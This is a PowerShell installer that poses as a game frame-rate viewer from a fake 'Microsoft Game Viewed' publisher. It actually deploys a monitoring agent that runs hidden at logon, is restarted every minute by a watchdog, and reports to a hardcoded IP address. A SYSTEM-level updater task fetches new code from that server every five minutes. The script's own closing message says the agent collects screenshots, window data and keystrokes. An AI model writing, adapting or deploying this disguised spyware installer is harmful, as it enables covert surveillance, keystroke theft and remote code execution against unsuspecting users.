param(
    [switch]$Install,
    [switch]$Remove,
    [switch]$Start,
    [switch]$Stop,
    [switch]$Status,
    [string]$ServerHost,
    [string]$ServerPort
)

$ErrorActionPreference = "Stop"

$script:ProductName = "GameFrameRateViewer"
$script:ProductPublisher = "Microsoft Game Viewed"
$script:ProcessName = "GameFrameRateViewer"
$script:MainTaskName = "GameFrameRateViewer"
$script:WatchdogTaskName = "GameFrameRateViewer Watchdog"
$script:ServerHost = if ([string]::IsNullOrWhiteSpace($ServerHost)) { "108.187.15.71" } else { $ServerHost.Trim() }
$script:ServerPort = if ([string]::IsNullOrWhiteSpace($ServerPort)) { "8899" } else { $ServerPort.Trim() }
$script:InstallDir = Join-Path $env:ProgramData "GameFrameRateViewer"
$script:UserDataDir = Join-Path $env:LOCALAPPDATA "GameFrameRateViewer"
$script:LegacyUserDataDir = Join-Path $env:LOCALAPPDATA "MonitorAgent"
$script:LegacyLauncherPath = Join-Path $script:LegacyUserDataDir "run-hidden.vbs"
$script:InstallExe = Join-Path $script:InstallDir "$script:ProcessName.exe"
$script:SourceExe = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "monitor-agent.exe"
$script:SourceUpdater = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "updater.ps1"
$script:SourceRunner = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "runner.ps1"
$script:LauncherPath = Join-Path $script:InstallDir "run-hidden.vbs"
$script:WatchdogPath = Join-Path $script:InstallDir "watchdog.vbs"
$script:UpdaterPath = Join-Path $script:InstallDir "updater.ps1"
$script:UpdaterDir = Join-Path $script:InstallDir "updater"
$script:RunnerPath = Join-Path $script:UpdaterDir "runner.ps1"
$script:UpdaterTaskPath = Join-Path $script:UpdaterDir "updater.ps1"
$script:UpdaterConfigPath = Join-Path $script:UpdaterDir "updater-config.json"
$script:ConfigPath = Join-Path $script:InstallDir "config.json"
$script:DownloadsDir = Join-Path $script:InstallDir "downloads"
$script:PreviousDir = Join-Path $script:InstallDir "previous"
$script:LogDir = Join-Path $script:UserDataDir "logs"
$script:LogPath = Join-Path $script:LogDir "install.log"
$script:UpdaterTaskName = "GameFrameRateViewer Updater"

function Write-InstallLog {
    param([string]$Message)
    New-Item -ItemType Directory -Force -Path $script:LogDir | Out-Null
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
    Add-Content -Path $script:LogPath -Value $line -Encoding UTF8
}

function Invoke-NativeQuiet {
    param(
        [Parameter(Mandatory=$true)][string]$FilePath,
        [Parameter(Mandatory=$true)][string[]]$Arguments
    )
    $oldPreference = $ErrorActionPreference
    try {
        $ErrorActionPreference = "Continue"
        $output = & $FilePath @Arguments 2>&1
        return @{
            ExitCode = $LASTEXITCODE
            Output = (($output | Out-String).Trim())
        }
    } finally {
        $ErrorActionPreference = $oldPreference
    }
}

function Assert-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) { return }

    $argList = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"")
    if ($Install) { $argList += "-Install" }
    if ($Remove) { $argList += "-Remove" }
    if ($Start) { $argList += "-Start" }
    if ($Stop) { $argList += "-Stop" }
    if ($Status) { $argList += "-Status" }
    if ($script:ServerHost) { $argList += "-ServerHost `"$script:ServerHost`"" }
    if ($script:ServerPort) { $argList += "-ServerPort `"$script:ServerPort`"" }
    Start-Process powershell.exe -ArgumentList ($argList -join " ") -Verb RunAs
    exit
}

function Test-AgentSource {
    if (-not (Test-Path $script:SourceExe)) {
        throw "monitor-agent.exe not found. Keep installer script and program in the same folder."
    }
    if (-not (Test-Path $script:SourceUpdater)) {
        throw "updater.ps1 not found. Keep installer script, updater, and program in the same folder."
    }
    if (-not (Test-Path $script:SourceRunner)) {
        throw "runner.ps1 not found. Keep installer script, runner, updater, and program in the same folder."
    }
}

function Get-MachineId {
    try {
        $value = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -ErrorAction Stop).MachineGuid
        if (-not [string]::IsNullOrWhiteSpace($value)) { return $value }
    } catch {}
    return $env:COMPUTERNAME
}

function Get-OrCreateInstallId {
    if (Test-Path $script:ConfigPath) {
        try {
            $existing = Get-Content -Path $script:ConfigPath -Encoding UTF8 -Raw | ConvertFrom-Json
            if ($existing.install_id) { return [string]$existing.install_id }
        } catch {}
    }
    return [guid]::NewGuid().ToString("N")
}

function Stop-AgentProcesses {
    foreach ($name in @($script:ProcessName, "WindowsMonitor", "monitor-agent")) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Write-InstallLog "Stopping old process $name PID=$($_.Id)"
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            } catch {
                Write-InstallLog "Failed to stop old process $name PID=$($_.Id): $($_.Exception.Message)"
            }
        }
    }

    $deadline = (Get-Date).AddSeconds(20)
    do {
        $running = Get-Process -Name $script:ProcessName, "WindowsMonitor", "monitor-agent" -ErrorAction SilentlyContinue
        if (-not $running) { return }
        Start-Sleep -Milliseconds 500
    } while ((Get-Date) -lt $deadline)

    $left = Get-Process -Name $script:ProcessName, "WindowsMonitor", "monitor-agent" -ErrorAction SilentlyContinue
    if ($left) {
        $pids = ($left | ForEach-Object { "$($_.ProcessName):$($_.Id)" }) -join ", "
        throw "Agent process still running after stop request: $pids"
    }
}

function Test-ScheduledTaskExists {
    param([string]$TaskName)
    $result = Invoke-NativeQuiet "schtasks.exe" @("/Query", "/TN", $TaskName)
    return $result.ExitCode -eq 0
}

function Write-LegacyNoopLauncher {
    New-Item -ItemType Directory -Force -Path $script:LegacyUserDataDir | Out-Null
    $content = @"
' Legacy MonitorAgent task fallback.
' The old scheduled task could not be deleted, so this file exits quietly.
WScript.Quit 0
"@
    Set-Content -Path $script:LegacyLauncherPath -Value $content -Encoding ASCII
    Write-InstallLog "Legacy MonitorAgent task still exists; wrote noop VBS: $script:LegacyLauncherPath"
}

function Remove-OldTasksAndService {
    foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, $script:UpdaterTaskName, "Windows Monitor", "Windows Monitor Watchdog", "MonitorAgent")) {
        Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $task) | Out-Null
        Invoke-NativeQuiet "schtasks.exe" @("/Delete", "/TN", $task, "/F") | Out-Null
    }

    if (Test-ScheduledTaskExists "MonitorAgent") {
        Write-LegacyNoopLauncher
    } elseif (Test-Path $script:LegacyUserDataDir) {
        Remove-Item -LiteralPath $script:LegacyUserDataDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-InstallLog "Removed legacy local dir: $script:LegacyUserDataDir"
    }

    $svc = Get-Service -Name "MonitorAgent" -ErrorAction SilentlyContinue
    if ($svc) {
        try {
            if ($svc.Status -eq "Running") {
                Stop-Service -Name "MonitorAgent" -Force -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
            }
            Invoke-NativeQuiet "sc.exe" @("delete", "MonitorAgent") | Out-Null
            Write-InstallLog "Removed legacy Windows service"
        } catch {
            Write-InstallLog "Failed to remove legacy Windows service: $($_.Exception.Message)"
        }
    }
}

function Set-InstallDirectoryAcl {
    $acl = Get-Acl $script:InstallDir
    $acl.SetAccessRuleProtection($true, $false)

    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $allow = [System.Security.AccessControl.AccessControlType]"Allow"
    $rules = @(
        [System.Security.AccessControl.FileSystemAccessRule]::new("SYSTEM", [System.Security.AccessControl.FileSystemRights]"FullControl", $inheritance, $propagation, $allow),
        [System.Security.AccessControl.FileSystemAccessRule]::new("Administrators", [System.Security.AccessControl.FileSystemRights]"FullControl", $inheritance, $propagation, $allow),
        [System.Security.AccessControl.FileSystemAccessRule]::new("Users", [System.Security.AccessControl.FileSystemRights]"Modify", $inheritance, $propagation, $allow)
    )
    foreach ($rule in $rules) {
        $acl.AddAccessRule($rule)
    }
    Set-Acl -Path $script:InstallDir -AclObject $acl
}

function Write-AgentConfig {
    $installId = Get-OrCreateInstallId
    $machineId = Get-MachineId
    $serverUrl = "http://$script:ServerHost`:$script:ServerPort"
    $config = [ordered]@{
        server_host = $script:ServerHost
        server_port = $script:ServerPort
        server_url = $serverUrl
        install_dir = $script:InstallDir
        user_data_dir = $script:UserDataDir
        install_id = $installId
        machine_id = $machineId
        product_publisher = $script:ProductPublisher
        updater_version = "0.59.5"
        update_enabled = $true
        update_check_interval = 300
        installed_at = (Get-Date).ToString("s")
    }
    $config | ConvertTo-Json | Set-Content -Path $script:ConfigPath -Encoding UTF8

    New-Item -ItemType Directory -Force -Path $script:UpdaterDir | Out-Null
    $updaterConfig = [ordered]@{
        server_host = $script:ServerHost
        server_port = $script:ServerPort
        server_url = $serverUrl
        install_dir = $script:InstallDir
        install_id = $installId
        machine_id = $machineId
        updater_version = "0.59.5"
    }
    $updaterConfig | ConvertTo-Json | Set-Content -Path $script:UpdaterConfigPath -Encoding UTF8
}

function Sync-UninstallRegistry {
    $roots = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    )
    foreach ($root in $roots) {
        Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $item = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction Stop
                if ($item.DisplayName -eq $script:ProductName) {
                    Set-ItemProperty -LiteralPath $_.PSPath -Name "DisplayVersion" -Value "0.59.5" -ErrorAction Stop
                    Set-ItemProperty -LiteralPath $_.PSPath -Name "Publisher" -Value $script:ProductPublisher -ErrorAction Stop
                    Set-ItemProperty -LiteralPath $_.PSPath -Name "DisplayIcon" -Value $script:InstallExe -ErrorAction Stop
                    Write-InstallLog "Updated uninstall registry version=0.59.5 publisher=$script:ProductPublisher"
                }
            } catch {
                Write-InstallLog "Failed to update uninstall registry $($_.PSPath): $($_.Exception.Message)"
            }
        }
    }
}

function Write-HiddenLauncher {
    $exe = $script:InstallExe
    $serverHost = $script:ServerHost
    $serverPort = $script:ServerPort
    $content = @"
Set WshShell = CreateObject("WScript.Shell")
Set Env = WshShell.Environment("PROCESS")
Env("MONITOR_SERVER_HOST") = "$serverHost"
Env("MONITOR_SERVER_PORT") = "$serverPort"
WshShell.Run """" & "$exe" & """ --background", 0, False
"@
    Set-Content -Path $script:LauncherPath -Value $content -Encoding ASCII
}

function Write-WatchdogScript {
    $launcher = $script:LauncherPath.Replace('"', '""')
    $processName = $script:ProcessName
    $content = @"
Set WshShell = CreateObject("WScript.Shell")
Set WMI = GetObject("winmgmts:\\.\root\cimv2")
Set Procs = WMI.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name = '$processName.exe'")
If Procs.Count = 0 Then
    WshShell.Run """" & "$launcher" & """", 0, False
End If
"@
    Set-Content -Path $script:WatchdogPath -Value $content -Encoding ASCII
    Remove-Item -LiteralPath (Join-Path $script:InstallDir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
}

function New-MonitorTasks {
    $mainAction = "wscript.exe `"$script:LauncherPath`""
    $watchdogAction = "wscript.exe `"$script:WatchdogPath`""
    $runnerAction = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File $script:RunnerPath -InstallDir $script:InstallDir"

    $mainOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:MainTaskName, "/TR", $mainAction, "/SC", "ONLOGON", "/RL", "HIGHEST", "/IT", "/F")
    if ($mainOut.ExitCode -ne 0) {
        throw "Failed to create logon task: $($mainOut.Output)"
    }

    $watchOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:WatchdogTaskName, "/TR", $watchdogAction, "/SC", "MINUTE", "/MO", "1", "/RL", "HIGHEST", "/IT", "/F")
    if ($watchOut.ExitCode -ne 0) {
        throw "Failed to create watchdog task: $($watchOut.Output)"
    }

    $updaterOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:UpdaterTaskName, "/TR", $runnerAction, "/SC", "MINUTE", "/MO", "5", "/RU", "SYSTEM", "/RL", "HIGHEST", "/F")
    if ($updaterOut.ExitCode -ne 0) {
        throw "Failed to create updater task: $($updaterOut.Output)"
    }
    Write-InstallLog "Created updater task: $runnerAction"
}

function Start-Monitor {
    $runOut = Invoke-NativeQuiet "schtasks.exe" @("/Run", "/TN", $script:MainTaskName)
    if ($runOut.ExitCode -ne 0) {
        Write-InstallLog "Scheduled task start failed, falling back to direct start: $($runOut.Output)"
    }
    Start-Sleep -Seconds 3
    $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
    if (-not $proc) {
        Write-InstallLog "Scheduled task did not start process, falling back to hidden launcher"
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$script:LauncherPath`"" -WindowStyle Hidden
        Start-Sleep -Seconds 3
    }
    $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
    if (-not $proc) {
        throw "$script:ProcessName.exe is not running. Check log: $script:LogPath"
    }
    Write-InstallLog "Background process started PID=$($proc[0].Id)"
}

function Install-Agent {
    Assert-Admin
    Test-AgentSource
    Write-InstallLog "Installing $script:ProductName, server $script:ServerHost`:$script:ServerPort"

    New-Item -ItemType Directory -Force -Path $script:InstallDir | Out-Null
    New-Item -ItemType Directory -Force -Path $script:UpdaterDir | Out-Null
    New-Item -ItemType Directory -Force -Path $script:DownloadsDir | Out-Null
    New-Item -ItemType Directory -Force -Path $script:PreviousDir | Out-Null
    New-Item -ItemType Directory -Force -Path $script:LogDir | Out-Null
    Remove-OldTasksAndService
    Stop-AgentProcesses

    Copy-Item -Force -Path $script:SourceExe -Destination $script:InstallExe
    Copy-Item -Force -Path $script:SourceUpdater -Destination $script:UpdaterPath
    Copy-Item -Force -Path $script:SourceUpdater -Destination $script:UpdaterTaskPath
    Copy-Item -Force -Path $script:SourceRunner -Destination $script:RunnerPath
    Write-AgentConfig
    Write-HiddenLauncher
    Write-WatchdogScript
    Set-InstallDirectoryAcl
    New-MonitorTasks
    Sync-UninstallRegistry
    Start-Monitor
    Invoke-NativeQuiet "schtasks.exe" @("/Run", "/TN", $script:UpdaterTaskName) | Out-Null

    Write-InstallLog "Install completed"
}

function Remove-Agent {
    Assert-Admin
    Remove-OldTasksAndService
    Stop-AgentProcesses
    if (Test-Path $script:InstallDir) {
        $acl = Get-Acl $script:InstallDir
        $acl.SetAccessRuleProtection($false, $true)
        Set-Acl -Path $script:InstallDir -AclObject $acl
        Remove-Item -LiteralPath $script:InstallDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-InstallLog "Uninstall completed"
}

function Show-Status {
    $tasks = @($script:MainTaskName, $script:WatchdogTaskName)
    foreach ($task in $tasks) {
        $result = Invoke-NativeQuiet "schtasks.exe" @("/Query", "/TN", $task)
        if ($result.ExitCode -eq 0) {
            Write-Host $result.Output
        } else {
            Write-Host "$task is not registered"
        }
    }
    $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
    if ($proc) {
        Write-Host "$script:ProcessName.exe is running, PID=$($proc[0].Id)"
    } else {
        Write-Host "$script:ProcessName.exe is not running"
    }
    Write-Host "Server: $script:ServerHost`:$script:ServerPort"
}

try {
    if ($Remove) {
        Remove-Agent
        Write-Host "$script:ProductName uninstalled."
        exit 0
    }
    if ($Stop) {
        Assert-Admin
        Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $script:MainTaskName) | Out-Null
        Stop-AgentProcesses
        Write-Host "$script:ProductName stopped."
        exit 0
    }
    if ($Start) {
        Assert-Admin
        Start-Monitor
        Write-Host "$script:ProductName started."
        exit 0
    }
    if ($Status) {
        Show-Status
        exit 0
    }

    Install-Agent
    Write-Host "$script:ProductName installed and running in background."
    Write-Host "Server: $script:ServerHost`:$script:ServerPort"
    Write-Host "Install dir: $script:InstallDir"
    Write-Host "Log dir: $script:LogDir"
    Write-Host "Note: screenshot/window/keyboard collection requires an active Windows desktop session."
    exit 0
} catch {
    Write-InstallLog "Failed: $($_.Exception.Message)"
    Write-Error $_.Exception.Message
    exit 1
}
